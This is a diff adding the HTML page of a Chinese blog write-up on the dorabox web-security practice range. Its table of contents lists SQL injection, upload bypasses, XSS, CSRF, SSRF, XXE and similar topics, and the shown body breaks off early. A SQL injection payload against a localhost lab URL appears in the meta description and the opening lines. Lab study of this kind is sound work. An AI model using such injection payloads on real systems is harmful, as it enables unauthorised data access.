@@ -1,0 +1,1055 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="# SQLi 字符型 # 过程： 字符型和数字型相比，就是要闭合单引号吧   单引号闭合，# 用 url 编码 %23： http:&#x2F;&#x2F;localhost&#x2F;dorabox&#x2F;sql_injection&#x2F;sql_string.php ?title&#x3D;1&#39; or 1&#x3D;1 %23&#39; &amp;submit&#x3D;submit  下面就是和数字型注入相同的操作。   利用 order by 或者 group by">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dorabox冒险手记">
+<meta property="og:url" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Milkii0的秘密花园">
+<meta property="og:description" content="# SQLi 字符型 # 过程： 字符型和数字型相比，就是要闭合单引号吧   单引号闭合，# 用 url 编码 %23： http:&#x2F;&#x2F;localhost&#x2F;dorabox&#x2F;sql_injection&#x2F;sql_string.php ?title&#x3D;1&#39; or 1&#x3D;1 %23&#39; &amp;submit&#x3D;submit  下面就是和数字型注入相同的操作。   利用 order by 或者 group by">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlchar002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlchar003.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlchar004.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlchar005.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlss001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlss002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlss003.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlss004.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlss005.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlss006.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_js003.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_js002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_js001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_all001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_all002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_mime001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_mime002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_mime003.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_hz001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_fp_nr001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlnum001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlnum007.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlnum002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlnum003.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlnum004.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlnum005.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlnum006.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_ssrf001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_ssrf002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_code002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_cmd001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_xss_ref001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_xss_ref002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_xss_sav001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_xss_sav001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_xss_sav002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_xss_sav001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_xss_dom001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_csrf_json001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_csrf_ky001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_csrf_json001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_csrf_json002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_filein002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_filein003.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_filein002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_filein004.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_filein003.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_jz_upload001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_jz_upload002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_readanyfile002.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_readanyfile001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_xxe001.png">
+<meta property="og:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_xxe002.png">
+<meta property="article:published_time" content="2020-10-15T08:40:33.000Z">
+<meta property="article:modified_time" content="2021-07-04T03:21:58.187Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="dorabox,靶场练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/dorabox_sqlchar002.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>dorabox冒险手记</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Milkii0的秘密花园" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/10/30/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&text=dorabox冒险手记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&is_video=false&description=dorabox冒险手记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dorabox冒险手记&body=Check out this article: http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&title=dorabox冒险手记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&name=dorabox冒险手记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/&t=dorabox冒险手记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.</span> <span class="toc-text"> SQLi 字符型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli%E6%90%9C%E7%B4%A2%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text"> SQLi 搜索型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-2"><span class="toc-number">2.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">2.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#js%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text"> JS 限制文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-3"><span class="toc-number">3.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">3.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.</span> <span class="toc-text"> 任意文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-4"><span class="toc-number">4.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-number">4.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mime%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.</span> <span class="toc-text"> MIME 限制文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-5"><span class="toc-number">5.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-5"><span class="toc-number">5.2.</span> <span class="toc-text"> 总结：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#content-description"><span class="toc-number">5.2.1.</span> <span class="toc-text"> Content-Description:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E5%90%8D%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text"> 拓展名限制文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-6"><span class="toc-number">6.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-6"><span class="toc-number">6.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">7.</span> <span class="toc-text"> 内容限制文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-7"><span class="toc-number">7.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-7"><span class="toc-number">7.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli%E6%95%B0%E5%AD%97%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text"> SQLi 数字手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-8"><span class="toc-number">8.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-8"><span class="toc-number">8.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf"><span class="toc-number">9.</span> <span class="toc-text"> SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-9"><span class="toc-number">9.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-9"><span class="toc-number">9.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">10.</span> <span class="toc-text"> 任意代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-10"><span class="toc-number">10.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-10"><span class="toc-number">10.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">11.</span> <span class="toc-text"> 任意命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-11"><span class="toc-number">11.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-11"><span class="toc-number">11.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84xss"><span class="toc-number">12.</span> <span class="toc-text"> 反射 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-12"><span class="toc-number">12.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-12"><span class="toc-number">12.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">13.</span> <span class="toc-text"> 存储型 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-13"><span class="toc-number">13.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-13"><span class="toc-number">13.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dom%E5%9E%8Bxss"><span class="toc-number">14.</span> <span class="toc-text"> DOM 型 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-14"><span class="toc-number">14.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-14"><span class="toc-number">14.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90"><span class="toc-number">15.</span> <span class="toc-text"> CSRF 跨域资源</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-15"><span class="toc-number">15.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-15"><span class="toc-number">15.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jsonp%E5%8A%AB%E6%8C%81"><span class="toc-number">16.</span> <span class="toc-text"> JSONP 劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-16"><span class="toc-number">16.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-16"><span class="toc-number">16.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">17.</span> <span class="toc-text"> 任意文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-17"><span class="toc-number">17.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-17"><span class="toc-number">17.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2"><span class="toc-number">18.</span> <span class="toc-text"> 任意文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-18"><span class="toc-number">18.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-18"><span class="toc-number">18.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E6%94%AF%E4%BB%98"><span class="toc-number">19.</span> <span class="toc-text"> 条件竞争 - 支付</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-19"><span class="toc-number">19.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-19"><span class="toc-number">19.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E4%B8%8A%E4%BC%A0"><span class="toc-number">20.</span> <span class="toc-text"> 条件竞争 - 上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-20"><span class="toc-number">20.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-20"><span class="toc-number">20.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">21.</span> <span class="toc-text"> 任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-21"><span class="toc-number">21.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-21"><span class="toc-number">21.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xxe"><span class="toc-number">22.</span> <span class="toc-text"> xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-22"><span class="toc-number">22.1.</span> <span class="toc-text"> 过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-22"><span class="toc-number">22.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E5%93%A6"><span class="toc-number">23.</span> <span class="toc-text"> 最后哦</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        dorabox冒险手记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-10-15T08:40:33.000Z" itemprop="datePublished">2020-10-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%A4%A7%E5%86%92%E9%99%A9/">大冒险</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/dorabox-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag">dorabox,靶场练习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="sqli字符型"><a class="markdownIt-Anchor" href="#sqli字符型">#</a> SQLi 字符型</h1>
+<h2 id="过程"><a class="markdownIt-Anchor" href="#过程">#</a> 过程：</h2>
+<p>字符型和数字型相比，就是要闭合单引号吧</p>
+<ol>
+<li>
+<p>单引号闭合，# 用 url 编码 %23：</p>
